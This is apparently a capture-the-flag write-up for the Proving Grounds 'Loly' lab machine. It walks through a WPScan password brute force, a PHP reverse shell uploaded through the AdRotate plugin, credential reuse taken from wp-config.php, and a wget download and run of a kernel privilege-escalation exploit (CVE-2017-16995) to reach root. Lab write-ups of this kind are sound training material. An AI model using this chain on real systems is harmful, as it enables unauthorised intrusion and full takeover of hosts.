---
layout: default
title: Loly
parent: Proving Grounds Play
nav_order: 26
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/loly]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.242.121
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-14 21:06 EST
Nmap scan report for 192.168.242.121
Host is up (0.12s latency).
Not shown: 65050 closed tcp ports (reset), 484 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.31 seconds

```

# Enumeration

---

## 80 | HTTP

### Gobuster scan

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/loly]
└─$ gobuster dir -u http://192.168.242.121 -w /usr/share/wordlists/custom/large_directories.txt -x aspx,php,txt,conf -t 80 -k
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.242.121
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/custom/large_directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              aspx,php,txt,conf
[+] Timeout:                 10s
===============================================================
2023/11/14 21:08:11 Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 194] [--> http://192.168.242.121/wordpress/]
```

Checking _/wordpress/wp-admin_ results in page not found and attempted redirect to _loly.lc/wordpress_

Updating _/etc/hosts_

![admin](../../../assets/images/ctfs/proving_grounds/loly/admin.png)

### WPScan

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/loly]
└─$ wpscan --url http://loly.lc/wordpress --disable-tls-checks --enumerate p --enumerate t --enumerate

[i] User(s) Identified:

[+] loly
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

Run WPScan brute force on _loly_ user

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/loly]
└─$ wpscan --url http://loly.lc/wordpress --disable-tls-checks -U users.txt -P /usr/share/wordlists/rock
you.txt

[+] Performing password attack on Xmlrpc against 2 user/s
[SUCCESS] - loly / fernando
```

# Exploitation

---

Logon to _loly.lc/wordpress/wp-admin_ as _loly_

## Exploit AdRotate Plugin

The _AdRotate_ plugin allows file upload in zip format

![banner](../../../assets/images/ctfs/proving_grounds/loly/banner.png)

Edit php-reverse-shell.php and zip as _rev.php_ within _zip.php_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/loly]
└─$ zip rev.zip  rev.php
  adding: rev.php (deflated 59%)

```

Upload rev.zip

![upload](../../../assets/images/ctfs/proving_grounds/loly/upload.png)

Trigger by navigating to _/wordpress/wp-content/banners/rev.php_

![trigger](../../../assets/images/ctfs/proving_grounds/loly/trigger.png)

Receive the reverse shell in our netcat listener.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/loly]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.242.121] 60228
Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 18:34:05 up  1:45,  0 users,  load average: 0.02, 0.05, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# Post-Exploitation

---

## Enumerate Wordpress Config Files

Locate db creds in _wp-config.php_

```bash
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', 'lolyisabeautifulgirl' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

## Pivot to Loly User

First tried the _lolyisabeautifulgirl_ password on _loly_ and it worked.

```bash
www-data@ubuntu:~/html/wordpress$ su loly
Password:
loly@ubuntu:/var/www/html/wordpress$ id
uid=1000(loly) gid=1000(loly) groups=1000(loly),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)

```

## Check Kernal Version

```bash
loly@ubuntu:/home$ uname -a
Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
```

This version of Ubuntu 4.4.0-31-generic is vulnerable to CVE-2017-16995.

![searchsploit](../../../assets/images/ctfs/proving_grounds/loly/searchsploit.png)

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/loly]
└─$ searchsploit -m 45010
  Exploit: Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/45010
     Path: /usr/share/exploitdb/exploits/linux/local/45010.c
    Codes: CVE-2017-16995
 Verified: True
File Type: C source, ASCII text
Copied to: /home/vagrant/Documents/PG/PLAY/loly/45010.c



┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/loly]
└─$ gcc 45010.c -o 45010 --static

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/loly]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

Upload and run on the target to get root shell

```bash
loly@ubuntu:/home$ cd /tmp
loly@ubuntu:/tmp$ get http://192.168.45.217:8000/45010
No command 'get' found, but there are 18 similar ones
get: command not found
loly@ubuntu:/tmp$ wget http://192.168.45.217:8000/45010
--2023-11-14 18:50:07--  http://192.168.45.217:8000/45010
Connecting to 192.168.45.217:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 776472 (758K) [application/octet-stream]
Saving to: ‘45010’

45010                     100%[=====================================>] 758.27K   857KB/s    in 0.9s

2023-11-14 18:50:08 (857 KB/s) - ‘45010’ saved [776472/776472]

loly@ubuntu:/tmp$ chmod +x 45010
loly@ubuntu:/tmp$ ./45010
[.]
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.]
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.]
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88007a8aac00
[*] Leaking sock struct from ffff8800349703c0
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff8800773d2540
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff8800773d2540
[*] credentials patched, launching shell...
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(loly)
# whoami
root

```
